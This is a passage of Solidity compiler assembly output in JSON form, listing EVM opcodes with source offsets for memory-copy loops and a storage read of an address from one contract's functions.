											"value": "58"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "56"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "58"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "59"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "61"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "59"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "61"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "62"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "64"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "62"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "64"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "65"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "67"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "65"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "67"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP5",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "SWAP7",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7025,
											"end": 7119,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "tag",
											"source": 3,
											"value": "22"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "tag",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7758,
											"end": 7771,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 7778,
											"end": 7807,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7810,
											"end": 7831,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 7810,
											"end": 7829,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 7810,
											"end": 7831,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7810,
											"end": 7831,
											"name": "tag",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 7810,
											"end": 7831,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7778,
											"end": 7831,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7778,
											"end": 7831,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7867,
											"end": 7882,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7850,
											"end": 7883,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "70"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "72"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
